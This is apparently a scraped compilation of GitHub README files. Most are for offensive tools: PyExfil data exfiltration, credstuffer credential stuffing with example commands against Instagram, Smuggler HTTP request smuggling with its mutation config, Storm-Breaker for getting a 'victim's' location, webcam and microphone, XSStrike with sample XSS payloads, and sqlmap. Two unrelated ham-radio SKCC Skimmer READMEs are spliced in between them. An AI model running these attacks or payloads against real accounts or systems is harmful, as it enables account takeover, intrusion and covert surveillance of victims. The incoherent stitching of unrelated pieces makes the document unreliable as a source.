  * [JetDirect](https://github.com/ytisf/PyExfil/blob/master/USAGE.md#jetdirect)
  * [GQUIC](https://github.com/ytisf/PyExfil/blob/master/USAGE.md#gquic) - [Google Quick UDP](https://www.chromium.org/quic) Internet Connections (Client Hello)
  * [MDNS Query](https://github.com/ytisf/PyExfil/blob/master/USAGE.md#mdns-query) - *Can be used as broadcast.*
  * [AllJoyn](https://github.com/ytisf/PyExfil/blob/master/USAGE.md#alljoyn). Name Service Protocol (IoT discovery) Version 0 ISAT.
  * [PacketSize](https://github.com/ytisf/PyExfil/blob/master/USAGE.md#packet-size). Using size of packet rather than actual data.  
  * [UDP-Source-Port](https://github.com/ytisf/PyExfil/blob/master/USAGE.md#udp-sport) Using the source port in UDP as a transmission medium.
  * [CertExchange](https://github.com/ytisf/PyExfil/blob/master/USAGE.md#Certificate-Exchange) Leveraging certificate exchange function for short bursts of communication.
  * [DNSQ](https://github.com/ytisf/PyExfil/blob/master/USAGE.md#DNSQ) Leveraging DNS Queries for communication.
  * [ICMP_TTL](https://github.com/ytisf/PyExfil/blob/master/USAGE.md#ICMP_TTL) Leveraging the TTL byte for communication. Very short but also stealthy. 
* **Physical**
  * [Audio](https://github.com/ytisf/PyExfil/blob/master/USAGE.md#audio) - *No listener*.
  * [QR Codes](https://github.com/ytisf/PyExfil/blob/master/USAGE.md#qr-codes)
  * [WiFi - On Payload](https://github.com/ytisf/PyExfil/blob/master/USAGE.md#wifi-frame-payload)
  * [3.5mm Jack](https://github.com/ytisf/PyExfil/blob/master/USAGE.md#3.5mm-jack)
  * [UltraSonic](https://github.com/ytisf/PyExfil/blob/master/USAGE.md#ultrasonic)
* **Steganography**
  * [Binary Offset](https://github.com/ytisf/PyExfil/blob/master/USAGE.md#image-binary-offset)
  * [Video Transcript to Dictionary](https://github.com/ytisf/PyExfil/blob/master/USAGE.md#video-dictionary)
  * [Braille Text Document](https://github.com/ytisf/PyExfil/blob/master/USAGE.md#braille-text-document)
  * [PNG Transparency](https://github.com/ytisf/PyExfil/blob/master/USAGE.md#png-transparency)
  * [ZIPCeption](https://github.com/ytisf/PyExfil/blob/master/USAGE.md#zip-loop)
  * [DataMatrix over LSB](https://github.com/ytisf/PyExfil/blob/master/USAGE.md#datamatrix-over-lsb)

For usage per modules have a look at the [USAGE](https://www.github.com/ytisf/PyExfil/USAGE.md) file.

## Data Generation
Although this tool was initially created as a game and later on turned to be a Red Team oriented tool, at the end of a day a major usage of `PyExfil` is to test various DLP (Data Leakage Protection) systems as well as detection of intrusion. To make the latter mission simpler we have created a little module to generate fake data with a structure that matches both PII and PCI data sets. These are intended to trigger alerts while being broadcate outside of the network.

Here is how to use it:

```python
from pyexfil.includes import CreateTestData

c = CreateTestData(rows=1000, output_location="/tmp/list.csv")
c.Run()
```

After this you can use which ever `PyExfil` module you would like to try and exfiltrate the data set created. This way you can test your detection without risking exfiltrating valuable data.


## Contributions

We welcome it! From testing, to improving quality of code and up to entirely new methods.

## Future Changes

### Versioning
For details about version look at the [tags on this repository](https://www.github.com/ytisf/PyExfil/tags).

### Version 1.0.0!
- [x] Surprise on restructure (Add Another).
- [x] Split `DOCUMENTATION.md` and `README.md` to two different files.
- [x] Get a nice logo.
- [x] Uniform calling convention for newer modules.
- [x] Exfiltration data-set generator (PII&PCI).

### Version 1.3 - Harpax:
- [x] Adding 4 new modules.
- [x] General fixups.
- [x] Some old modules recoded to fit new standard.
- [x] Full compatibility between Python2 and Python3.

### Version 1.4 - ?:
- [ ] Expand physical exfiltration channels.
- [ ] Re-test servers on older modules.
- [ ] Add file manipulation class (for example, module `zipception` does not fit into any existing category although currently residing under `Stega`).

### Hopefully - Close Future
- [x] Attempt at creating a more uniform call convention. *See DOCUMENTATION.md*.
- [ ] Fix that poorly written *setup.py*.
- [ ] Backport all old modules to new calling convention.

### In the Distant Future - The Year 2000
- [ ] Add Golang/C++ support for portability.
- [ ] Extensive testing for py2exe support.

## Acknowledgments

### People & Companies
- Big shout out to [JetBrains](https://www.jetbrains.com/)!!!
- Thanks to barachy and AM for ideas on protocols to use.
- Thanks to [Itzik Kotler](https://github.com/ikotler) for some ideas.
- Shout out to [@cac0ns3c](https://github.com/cac0ns3c) for resolving some dependency hell.
- Thanks to [@Nilesh0301](https://github.com/Nilesh0301) for pointing out some Python compatibility issues.
- Big thanks to [@hbmartin](https://github.com/hbmartin) for pointing us to [pytube3](https://github.com/get-pytube/pytube3) latest update and support.

### Resources
- Thanks [Wireshark](https://wireshark.com/) for your awesome wiki and tool. Especially [packet dumps](http://wiki.wireshark.org/SampleCaptures).
- Shout out to the [nmap](https://nmap.org/) guys.
- Thanks to [Trey Hunner](https://github.com/treyhunner) for the package [`names`](https://github.com/treyhunner/names).
- The [Faker](https://faker.readthedocs.io/en/master/) package.
- Special thanks to Thomas Baruchel and Fredrik de Vibe for the [txt2pdf](https://github.com/baruchel/txt2pdf) package we used in the `braille` exfiltration package.

## Quick Start
***

Edit the skcc_skimmer.cfg configuration file and replace these
parameters with your own information:

```
MY_CALLSIGN =  'x6xxx'
ADI_FILE    = r'MasterLog.adi'
GOALS       =  'all'
TARGETS     =  'c,TXn,SXn'
```

`MY_CALLSIGN`: Replace `x6xxx` with your callsign. (Leave the
quotes -- they are important.)


`ADI_FILE`: Replace 'MasterLog.adi' with a log file in ADI format.
It should be your complete master ADI file that contains all SKCC
contacts that you've ever made. It can include non SKCC members, which
will be ignored.  The small 'r' before the string is important
and should not be removed.


`GOALS`: Replace 'all' with one or more of the following, space
or comma separated (but not both). When in doubt, leave it as 'all'.

```
C     - You are working toward your C.
T     - You are working toward your T.
S     - You are working toward your S.
CXn   - You are working toward your an advanced Cx- awards.
TXn   - You are working toward your an advanced Tx- awards.
SXn   - You are working toward your an advanced Sx- awards.
WAS   - You are working toward your Worked All States.
WAS-C - You are working toward your Worked All States, Centurion.
WAS-T - You are working toward your Worked All States, Tribune.
WAS-S - You are working toward your Worked All States, Senator.
P     - You are attempting to accumulate prefix points.
all   - All of the above.
none  - None of the above.

GOALS Examples:
   GOALS = 'txn'
   GOALS = 'txn,sxn,p'
   GOALS = 'txn,sxn,p,was,was-c'
   GOALS = 'C,P'
   GOALS = 'all'
```

`TARGETS`: Replace 'C,TXn,SXn' with your preferences. When in doubt,
         use the default value of 'c,TXn,SXn'.

```
C     - You are helping others achieve their C.
T     - You are helping others achieve their T.
S     - You are helping others achieve their S.
CXn   - You are helping others achieve their advanced Cx- awards.
TXn   - You are helping others achieve their advanced Tx- awards.
SXn   - You are helping others achieve their advanced Sx- awards.
all   - All of the above.
none  - None of the above

TARGETS Examples:
   TARGETS = 'TXn,CXn'
   TARGETS = 'all'
   TARGETS = 'ALL'
   TARGETS = 'None'
```

Once you've changed these three configuration parameters, you
can run skcc_skimmer:

  `python skcc_skimmer.py`

Visit the SKCC Skimmer web page for the most up-to-date info:

https://www.k7mjg.com/SKCC_Skimmer


73,<br>
Mark<br>
K7MJG<br>




# SKCC SKIMMER WEBAPP

This is a web wrapper to [K7MJG's SKCC skimmmer][1] python application.

It parses the output of a out-of-the box configuration of his application and displays
them in a web page. This webpage is mobile friendly, too.

Behind the scenes, the web app will kick off a process for K7MJG's SKCC skimmer
application. You won't normally see the output of this process. The web app will
translate the output that you would normally see and places it in a convenient
website that you can browse **from inside your network**. 

**It's not recommended that you expose this website to the outside world. You 
do so at your own risk!!!**

**Main web app User Interface:**
<p align="center">
<img src="https://raw.githubusercontent.com/cwhelchel/skimmer_webapp/master/docs/img/screenshot1.png?raw=true" width="600" height="400" alt="Skimmer Screenshot" />
</p>

**Info from SKED page:**
<p align="center">
<img src="https://raw.githubusercontent.com/cwhelchel/skimmer_webapp/master/docs/img/screenshot2.png?raw=true" width="600" height="50" alt="SKED Screenshot" />
</p>

Note: the green text is what you get from a QSO from this member.

**Info from a RBN SPOT:**
<p align="center">
<img src="https://raw.githubusercontent.com/cwhelchel/skimmer_webapp/master/docs/img/screenshot3.png?raw=true" width="600" height="30" alt="SKED Screenshot" />
</p>

Note: This is highlighted blue because its the first time the skimmer saw this member
and you need them for goals or targets. They also may need you for their target hence the "/ they: C".

## Configuring SKCC SKIMMER

Once you've downloaded either the release or the source directly, you must configure
the SKCC SKIMMER in order for it to work correctly. If you have used [K7MJG's SKCC skimmmer][1] before then you have already done this and the rest should be easy.
If not there's only a few lines to configure.

If you have already run K7MJG's skimmer before then you just need to copy and paste  your existing ```skcc_skimmer.cfg``` over the included file of the same name. If you have never run the skimmer before, open the included file and update these three things: 

* Your callsign: `MY_CALLSIGN`
* Your QTHs Maidenhead GridSquare: `MY_GRIDSQUARE`
* the path to your master adi file (skcclogger): `ADI_FILE`

For example, here's what my ```skcc_skimmer.cfg``` looks like in the file (this 
is on Windows 10):

```python
    MY_CALLSIGN    = 'KQ4DAP'           
    MY_GRIDSQUARE  = 'EM82dl'           
    SPOTTER_RADIUS = 750          

    ADI_FILE       = r'C:\\SKCCLogger\\Logs\\skcc.adi'
```

You could also take the time to change your goals, targets, and bands. Refer to
the [skcc_skimmer configuration][2] for more information.

To configure web-app specific options open ```skimmerwebapp.cfg```.

## Running the Webapp - Windows

This section is for Windows users:

1) Download the release package
2) Extract to a location you will be able to find again
3) Update the included skcc_skimmer.cfg file inside the package by either:
   - copying an existing skcc_skimmer.cfg into here
   - open the file and update the needed settings
4) Execute the ```run_webapp.bat``` file.
5) Point your browser to http://127.0.0.1:5000 to see the website

You should see a command prompt appear with server status information and some other
output. This is the skimmer running and printing. It prints out a lot. If needed
this can be disabled, look in ```skimmwerwebapp.cfg```

## Running the Webapp - Others

This section is for non-Windows users and other cool people.

Run directly from source using Python. It's really not that hard, and the 
process is explained in the next sections:

### Install Dependencies

You need Python 3, Flask, and Flask_sock.

After installing Python, at the command prompt run these:

    $ python -m pip install flask
    $ python -m pip install flask_sock

Or, optionally

    $ python -m pip install -r requirements.txt    
    #  ^^^ will include pyinstaller which is needed for exe releases

### Running the WEB APP    

Once this file is updated and saved, you are ready to run the application at the command prompt, like so:

    $ python flask_app.py

Browse to the location it outputs (http://127.0.0.1:5000) and enjoy.

## Running with Docker

Coming soon. Hopefully!

73,

\- Cainan KQ4DAP


[1]: https://github.com/k7mjg/skcc_skimmer
[2]: https://www.k7mjg.com/#id_Configuration







# credstuffer
[![Build Status](https://jenkins.bierschi.com/buildStatus/icon?job=credstuffer)](https://jenkins.bierschi.com/job/credstuffer/)
[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://github.com/bierschi/credstuffer/blob/master/LICENSE)


**Features** of [credstuffer](https://github.com/bierschi/credstuffer):
- Stuffing social media accounts like comunio, instagram, facebook
- Provide easily credentials from directories, files or from a database connection
- Get Mail or Telegram notifications in success case
- Login requests are only made over proxies

## Installation

install [credstuffer](https://pypi.org/project/credstuffer/) with pip
<pre><code>
pip3 install credstuffer
</code></pre>

or from source
<pre><code>
sudo python3 setup.py install
</code></pre>


## Usage and Examples

Print the available arguments for credstuffer
<pre><code>
credstuffer --help
</code></pre>

Use it with a credential file of your choice
<pre><code>
credstuffer instagram --usernames "John, Jane" file --path /home/john/credentials.txt
</code></pre>

Provide a directory including multiple credential files
<pre><code>
credstuffer instagram --usernames "John, Jane" file --dir /home/john/credential_collection/
</code></pre>

Or fetch credential data from a database connection
<pre><code>
credstuffer instagram --usernames "John, Jane" database --host 192.168.1.2 --port 5432 --user john --password test1234 --dbname postgres --schemas a --tables abc
</code></pre>

Pass Mail Server params to get a notification in success case
<pre><code>
credstuffer instagram --usernames "John, Jane" --Nsmtp smtp.web.de --Nport 587 --Nsender sender@web.de --Nreceiver receiver@web.de --Npassword password file --dir /home/john/credential_collection/
</code></pre>

## Logs

logs can be found in `/var/log/credstuffer`

## Troubleshooting
add your current user to group `syslog`, this allows the application/scripts to create a folder in
`/var/log`. Replace `<user>` with your current user
<pre><code>
sudo adduser &lt;user&gt; syslog
</code></pre>
to apply this change, log out and log in again and check with the terminal command `groups`

## Changelog
All changes and versioning information can be found in the [CHANGELOG](https://github.com/bierschi/credstuffer/blob/master/CHANGELOG.rst)

## License
Copyright (c) 2019 Bierschneider Christian. See [LICENSE](https://github.com/bierschi/credstuffer/blob/master/LICENSE)
for details




------------------------------------------------------------------------------------------------------


   # Advanced Stealers Attacks 


   ```
  ______                         _              
 / _____)                       | |             
( (____  ____  _   _  ____  ____| | _____  ____ 
 \____ \|    \| | | |/ _  |/ _  | || ___ |/ ___)
 _____) ) | | | |_| ( (_| ( (_| | || ____| |    
(______/|_|_|_|____/ \___ |\___ |\_)_____)_|    
                    (_____(_____|               

     @defparam
```

# Smuggler

An HTTP Request Smuggling / Desync testing tool written in Python 3

## Acknowledgements

A special thanks to [James Kettle](https://skeletonscribe.net/) for his [research and methods into HTTP desyncs](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)

And a special thanks to [Ben Sadeghipour](https://www.nahamsec.com/) for beta testing Smuggler and for allowing me to discuss my work at [Nahamcon 2020](https://nahamcon.com)

## IMPORTANT
This tool does not guarantee no false-positives or false-negatives. Just because a mutation may report OK does not mean there isn't a desync issue, but more importantly just because the tool indicates a potential desync issue does not mean there definitely exists one. The script may encounter request processors from large entities (i.e. Google/AWS/Yahoo/Akamai/etc..) that may show false positive results.

## Installation

1) git clone https://github.com/defparam/smuggler.git
2) cd smuggler
3) python3 smuggler.py -h

## Example Usage

Single Host:
```
python3 smuggler.py -u <URL>
```

List of hosts:
```
cat list_of_hosts.txt | python3 smuggler.py
```

## Options

```
usage: smuggler.py [-h] [-u URL] [-v VHOST] [-x] [-m METHOD] [-l LOG] [-q]
                   [-t TIMEOUT] [--no-color] [-c CONFIGFILE]

optional arguments:
  -h, --help            show this help message and exit
  -u URL, --url URL     Target URL with Endpoint
  -v VHOST, --vhost VHOST
                        Specify a virtual host
  -x, --exit_early      Exit scan on first finding
  -m METHOD, --method METHOD
                        HTTP method to use (e.g GET, POST) Default: POST
  -l LOG, --log LOG     Specify a log file
  -q, --quiet           Quiet mode will only log issues found
  -t TIMEOUT, --timeout TIMEOUT
                        Socket timeout value Default: 5
  --no-color            Suppress color codes
  -c CONFIGFILE, --configfile CONFIGFILE
                        Filepath to the configuration file of payloads
```

Smuggler at a minimum requires either a URL via the -u/--url argument or a list of URLs piped into the script via stdin.
If the URL specifies `https://` then Smuggler will connect to the host:port using SSL/TLS. If the URL specifies `http://`
then no SSL/TLS will be used at all. If only the host is specified, then the script will default to `https://`

Use -v/--vhost \<host> to specify a different host header from the server address

Use -x/--exit_early to exit the scan of a given server when a potential issue is found. In piped mode smuggler will just continue to the next host on the list

Use -m/--method \<method> to specify a different HTTP verb from POST (i.e GET/PUT/PATCH/OPTIONS/CONNECT/TRACE/DELETE/HEAD/etc...)

Use -l/--log \<file> to write output to file as well as stdout

Use -q/--quiet reduce verbosity and only log issues found

Use -t/--timeout \<value> to specify the socket timeout. The value should be high enough to conclude that the socket is hanging, but low enough to speed up testing (default: 5)

Use --no-color to suppress the output color codes printed to stdout (logs by default don't include color codes)

Use -c/--configfile \<configfile> to specify your smuggler mutation configuration file (default: default.py)

## Config Files
Configuration files are python files that exist in the ./config directory of smuggler. These files describe the content of the HTTP requests and the transfer-encoding mutations to test.


Here is example content of default.py:
```python
def render_template(gadget):
	RN = "\r\n"
	p = Payload()
	p.header  = "__METHOD__ __ENDPOINT__?cb=__RANDOM__ HTTP/1.1" + RN
	# p.header += "Transfer-Encoding: chunked" +RN	
	p.header += gadget + RN
	p.header += "Host: __HOST__" + RN
	p.header += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36" + RN
	p.header += "Content-type: application/x-www-form-urlencoded; charset=UTF-8" + RN
	p.header += "Content-Length: __REPLACE_CL__" + RN
	return p


mutations["nameprefix1"] = render_template(" Transfer-Encoding: chunked")
mutations["tabprefix1"] = render_template("Transfer-Encoding:\tchunked")
mutations["tabprefix2"] = render_template("Transfer-Encoding\t:\tchunked")
mutations["space1"] = render_template("Transfer-Encoding : chunked")

for i in [0x1,0x4,0x8,0x9,0xa,0xb,0xc,0xd,0x1F,0x20,0x7f,0xA0,0xFF]:
	mutations["midspace-%02x"%i] = render_template("Transfer-Encoding:%cchunked"%(i))
	mutations["postspace-%02x"%i] = render_template("Transfer-Encoding%c: chunked"%(i))
	mutations["prespace-%02x"%i] = render_template("%cTransfer-Encoding: chunked"%(i))
	mutations["endspace-%02x"%i] = render_template("Transfer-Encoding: chunked%c"%(i))
	mutations["xprespace-%02x"%i] = render_template("X: X%cTransfer-Encoding: chunked"%(i))
	mutations["endspacex-%02x"%i] = render_template("Transfer-Encoding: chunked%cX: X"%(i))
	mutations["rxprespace-%02x"%i] = render_template("X: X\r%cTransfer-Encoding: chunked"%(i))
	mutations["xnprespace-%02x"%i] = render_template("X: X%c\nTransfer-Encoding: chunked"%(i))
	mutations["endspacerx-%02x"%i] = render_template("Transfer-Encoding: chunked\r%cX: X"%(i))
	mutations["endspacexn-%02x"%i] = render_template("Transfer-Encoding: chunked%c\nX: X"%(i))
```

There are no input arguments yet on specifying your own customer headers and user-agents. It is recommended to create your own configuration file based on default.py and modify it to your liking.

Smuggler comes with 3 configuration files: default.py (fast), doubles.py (niche, slow), exhaustive.py (very slow)
default.py is the fastest because it contains less mutations.

specify configuration files using the -c/--configfile \<configfile> command line option

## Payloads Directory
Inside the Smuggler directory is the payloads directory. When Smuggler finds a potential CLTE or TECL desync issue, it will automatically dump a binary txt file of the problematic payload in the payloads directory. All payload filenames are annotated with the hostname, desync type and mutation type. Use these payloads to netcat directly to the server or to import into other analysis tools.

## Helper Scripts
After you find a desync issue feel free to use my Turbo Intruder desync scripts found Here: https://github.com/defparam/tiscripts
`DesyncAttack_CLTE.py` and `DesyncAttack_TECL.py` are great scripts to help stage a desync attack

## License
These scripts are released under the MIT license. See [LICENSE](https://github.com/defparam/smuggler/blob/master/LICENSE).

<h1 align="center">
  <br>
  <a href="https://github.com/ultrasecurity/Storm-Breaker"><img src=".imgs/1demo.png" alt="StormBreaker"></a>

</h1>

<h4 align="center">A Tool With Attractive Capabilities. </h4>

<p align="center">

  <a href="http://python.org">
    <img src="https://img.shields.io/badge/python-v3-blue">
  </a>
  <a href="https://php.net">
    <img src="https://img.shields.io/badge/php-7.4.4-green"
         alt="php">
  </a>

  <a href="https://en.wikipedia.org/wiki/Linux">
    <img src="https://img.shields.io/badge/Platform-Linux-red">
  </a>

</p>

![demo](.imgs/screen1.jpeg)

### Features:

- Obtain Device Information Without Any Permission !
- Access Location [SMARTPHONES]
- Access Webcam
- Access Microphone

<br>

### Update Log:

- Second (latest) Update on November 4th , 2022 .
- The overall structure of the tool is programmed from the beginning and is available as a web panel (in previous versions, the tool was available in the command line).
- Previous version's bugs fixed !
- Auto-download Ngrok Added !
- The templates have been optimized !
- Logs can be downloaded (NEW) !
- Clear log Added !
- It can be uploaded on a personal host (you won't have the Ngork problems anymore)
- You can start and stop the listener anytime ! (At will)
- Beautified user interface (NEW) !

> We have deleted Ngrok in the new version of Storm breaker and entrusted the user with running and sharing the localhost . So please note that Storm breaker runs a localhost for you and you have to start the Ngrok on your intended port yourself .
> <br>

#### Attention! :

> This version can be run on both local host and your personal domain and host . However , you can use it for both situations. If your country has suspended the Ngrok service, or your country's banned Ngrok, or your victim can't open the Ngrok link (for the reasons such as : He sees such a link as suspicious, Or if this service is suspended in his country) We suggest using the tool on your personal host and domain .
> <br>

## Default username and password:

- `username` : `admin`
- `password` : `admin`
- You can edit the config.php file to change the username and password .
  <br>

### Dependencies

**`Storm Breaker`** requires following programs to run properly -

- `php`
- `python3`
- `git`
- `Ngrok`

<!-- ![demo](.imgs/Work3.gif) -->
<br>

### Platforms Tested

- Kali Linux 2022
- macOS Big Sur / M1
- Termux (android)
- Personal host (direct admin and cPanel)
  <br>

### Installation On Kali Linux

```
git clone https://github.com/ultrasecurity/Storm-Breaker
cd Storm-Breaker
sudo bash install.sh
sudo python3 -m pip install -r requirements.txt
sudo python3 st.py
```

<br>

**`how to run personal host 👇`**

> Zip the contents of the storm-web folder completely and upload it to the public_html path .

> Note that the tool should not be opened in a path like this > yourdomain.com/st-web
> Instead , it should be opened purely in the public_html path (i.e. : don't just zip the storm-web folder itself, but manually zip its contents (the index.php file and other belongings should be in the public_html path)

#### Attention!:

> Note that to use this tool on your Localhost , You also need SSL . Because many of the tool's capabilities require SSL .

#### Attention!:

> To run ngrok on termux you need to enable your personal hotspot and cellular network.

</p>



<h1 align="center">
  <br>
  <a href="https://github.com/s0md3v/XSStrike"><img src="https://image.ibb.co/cpuYoA/xsstrike-logo.png" alt="XSStrike"></a>
  <br>
  XSStrike
  <br>
</h1>

<h4 align="center">Advanced XSS Detection Suite</h4>

<p align="center">
  <a href="https://github.com/s0md3v/XSStrike/releases">
    <img src="https://img.shields.io/github/release/s0md3v/XSStrike.svg">
  </a>
  <a href="https://travis-ci.com/s0md3v/XSStrike">
    <img src="https://img.shields.io/travis/com/s0md3v/XSStrike.svg">
  </a>
  <a href="https://github.com/s0md3v/XSStrike/issues?q=is%3Aissue+is%3Aclosed">
      <img src="https://img.shields.io/github/issues-closed-raw/s0md3v/XSStrike.svg">
  </a>
</p>

![multi xss](https://image.ibb.co/gOCV5L/Screenshot-2018-11-19-13-33-49.png)

<p align="center">
  <a href="https://github.com/s0md3v/XSStrike/wiki">XSStrike Wiki</a> •
  <a href="https://github.com/s0md3v/XSStrike/wiki/Usage">Usage</a> •
  <a href="https://github.com/s0md3v/XSStrike/wiki/FAQ">FAQ</a> •
  <a href="https://github.com/s0md3v/XSStrike/wiki/For-Developers">For Developers</a> •
  <a href="https://github.com/s0md3v/XSStrike/wiki/Compatibility-&-Dependencies">Compatibility</a> •
  <a href="https://github.com/s0md3v/XSStrike#gallery">Gallery</a>
</p>

XSStrike is a Cross Site Scripting detection suite equipped with four hand written parsers, an intelligent payload generator, a powerful fuzzing engine and an incredibly fast crawler.

Instead of injecting payloads and checking it works like all the other tools do, XSStrike analyses the response with multiple parsers and then crafts payloads that are guaranteed to work by context analysis integrated with a fuzzing engine.
Here are some examples of the payloads generated by XSStrike:
```
}]};(confirm)()//\
<A%0aONMouseOvER%0d=%0d[8].find(confirm)>z
</tiTlE/><a%0donpOintErentER%0d=%0d(prompt)``>z
</SCRiPT/><DETAILs/+/onpoINTERenTEr%0a=%0aa=prompt,a()//
```
Apart from that, XSStrike has crawling, fuzzing, parameter discovery, WAF detection capabilities as well. It also scans for DOM XSS vulnerabilities.

### Main Features
- Reflected and DOM XSS scanning
- Multi-threaded crawling
- Context analysis
- Configurable core
- WAF detection & evasion
- Outdated JS lib scanning
- Intelligent payload generator
- Handmade HTML & JavaScript parser
- Powerful fuzzing engine
- Blind XSS support
- Highly researched work-flow
- Complete HTTP support
- Bruteforce payloads from a file
- Powered by [Photon](https://github.com/s0md3v/Photon), [Zetanize](https://github.com/s0md3v/zetanize) and [Arjun](https://github.com/s0md3v/Arjun)
- Payload Encoding

### Installation
Enter the following commands one by one in terminal:
```
git clone https://github.com/s0md3v/XSStrike
cd XSStrike
pip install -r requirements.txt --break-system-packages
```

Now, XSStrike can be used at any time as follows:
```
python xsstrike.py
```

### Documentation
- [Usage](https://github.com/s0md3v/XSStrike/wiki/Usage)
- [Compatibility & Dependencies](https://github.com/s0md3v/XSStrike/wiki/Compatibility-&-Dependencies)

### FAQ
- [It says fuzzywuzzy isn't installed but it is.](https://github.com/s0md3v/XSStrike/wiki/FAQ#it-says-fuzzywuzzy-is-not-installed-but-its)
- [What's up with Blind XSS?](https://github.com/s0md3v/XSStrike/wiki/FAQ#whats-up-with-blind-xss)
- [Why XSStrike boasts that it is the most advanced XSS detection suite?](https://github.com/s0md3v/XSStrike/wiki/FAQ#why-xsstrike-boasts-that-it-is-the-most-advanced-xss-detection-suite)
- [I like the project, what enhancements and features I can expect in future?](https://github.com/s0md3v/XSStrike/wiki/FAQ#i-like-the-project-what-enhancements-and-features-i-can-expect-in-future)
- [What's the false positive/negative rate?](https://github.com/s0md3v/XSStrike/wiki/FAQ#whats-the-false-positivenegative-rate)
- [Tool xyz works against the target, while XSStrike doesn't!](https://github.com/s0md3v/XSStrike/wiki/FAQ#tool-xyz-works-against-the-target-while-xsstrike-doesnt)
- [Can I copy it's code?](https://github.com/s0md3v/XSStrike/wiki/FAQ#can-i-copy-its-code)
- [What if I want to embed it into a proprietary software?](https://github.com/s0md3v/XSStrike/wiki/FAQ#what-if-i-want-to-embed-it-into-a-proprietary-software)

### Gallery
#### DOM XSS
![dom xss](https://image.ibb.co/bQaQ5L/Screenshot-2018-11-19-13-48-19.png)
#### Reflected XSS
![multi xss](https://image.ibb.co/gJogUf/Screenshot-2018-11-19-14-19-36.png)
#### Crawling
![crawling](https://image.ibb.co/e6Rezf/Screenshot-2018-11-19-13-50-59.png)
#### Fuzzing
![fuzzing](https://image.ibb.co/fnhuFL/Screenshot-2018-11-19-14-04-46.png)
#### Bruteforcing payloads from a file
![bruteforcing](https://image.ibb.co/dy5EFL/Screenshot-2018-11-19-14-08-36.png)
#### Interactive HTTP Headers Prompt
![headers](https://image.ibb.co/ecNph0/Screenshot-2018-11-19-14-29-35.png)
#### Hidden Parameter Discovery
![arjun](https://image.ibb.co/effjh0/Screenshot-2018-11-19-14-16-51.png)

### Contribution, Credits & License
Ways to contribute
- Suggest a feature
- Report a bug
- Fix something and open a pull request
- Help me document the code
- Spread the word

Licensed under the GNU GPLv3, see [LICENSE](LICENSE) for more information.

The WAF signatures in `/db/wafSignatures.json` are taken & modified from [sqlmap](https://github.com/sqlmapproject/sqlmap). I extracted them from sqlmap's waf detection modules which can found [here](https://github.com/sqlmapproject/sqlmap/blob/master/waf/) and converted them to JSON.\
`/plugins/retireJS.py` is a modified version of [retirejslib](https://github.com/FallibleInc/retirejslib/).




------------------------------------------------------------------------------------------------------

  # Advanced Sql Injection Attacks

# sqlmap ![](https://i.imgur.com/fe85aVR.png)

[![.github/workflows/tests.yml](https://github.com/sqlmapproject/sqlmap/actions/workflows/tests.yml/badge.svg)](https://github.com/sqlmapproject/sqlmap/actions/workflows/tests.yml) [![Python 2.6|2.7|3.x](https://img.shields.io/badge/python-2.6|2.7|3.x-yellow.svg)](https://www.python.org/) [![License](https://img.shields.io/badge/license-GPLv2-red.svg)](https://raw.githubusercontent.com/sqlmapproject/sqlmap/master/LICENSE) [![Twitter](https://img.shields.io/badge/twitter-@sqlmap-blue.svg)](https://twitter.com/sqlmap)

sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. It comes with a powerful detection engine, many niche features for the ultimate penetration tester, and a broad range of switches including database fingerprinting, over data fetching from the database, accessing the underlying file system, and executing commands on the operating system via out-of-band connections.

Screenshots
----

![Screenshot](https://raw.github.com/wiki/sqlmapproject/sqlmap/images/sqlmap_screenshot.png)

You can visit the [collection of screenshots](https://github.com/sqlmapproject/sqlmap/wiki/Screenshots) demonstrating some of the features on the wiki.

Installation
----

You can download the latest tarball by clicking [here](https://github.com/sqlmapproject/sqlmap/tarball/master) or latest zipball by clicking [here](https://github.com/sqlmapproject/sqlmap/zipball/master).

Preferably, you can download sqlmap by cloning the [Git](https://github.com/sqlmapproject/sqlmap) repository:

    git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev

sqlmap works out of the box with [Python](https://www.python.org/download/) version **2.6**, **2.7** and **3.x** on any platform.

Usage
----

To get a list of basic options and switches use:

    python sqlmap.py -h

To get a list of all options and switches use:

    python sqlmap.py -hh

You can find a sample run [here](https://asciinema.org/a/46601).
To get an overview of sqlmap capabilities, a list of supported features, and a description of all options and switches, along with examples, you are advised to consult the [user's manual](https://github.com/sqlmapproject/sqlmap/wiki/Usage).

Links
----

* Homepage: https://sqlmap.org
* Download: [.tar.gz](https://github.com/sqlmapproject/sqlmap/tarball/master) or [.zip](https://github.com/sqlmapproject/sqlmap/zipball/master)
* Commits RSS feed: https://github.com/sqlmapproject/sqlmap/commits/master.atom
* Issue tracker: https://github.com/sqlmapproject/sqlmap/issues
* User's manual: https://github.com/sqlmapproject/sqlmap/wiki
* Frequently Asked Questions (FAQ): https://github.com/sqlmapproject/sqlmap/wiki/FAQ
* X: [@sqlmap](https://twitter.com/sqlmap)
* Demos: [https://www.youtube.com/user/inquisb/videos](https://www.youtube.com/user/inquisb/videos)
* Screenshots: https://github.com/sqlmapproject/sqlmap/wiki/Screenshots

Translations
----

* [Bulgarian](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-bg-BG.md)
* [Chinese](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-zh-CN.md)
* [Croatian](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-hr-HR.md)
* [Dutch](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-nl-NL.md)
* [French](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-fr-FR.md)
* [Georgian](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-ka-GE.md)
* [German](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-de-DE.md)
* [Greek](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-gr-GR.md)
* [Hindi](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-in-HI.md)
* [Indonesian](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-id-ID.md)
* [Italian](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-it-IT.md)
* [Japanese](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-ja-JP.md)
* [Korean](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-ko-KR.md)
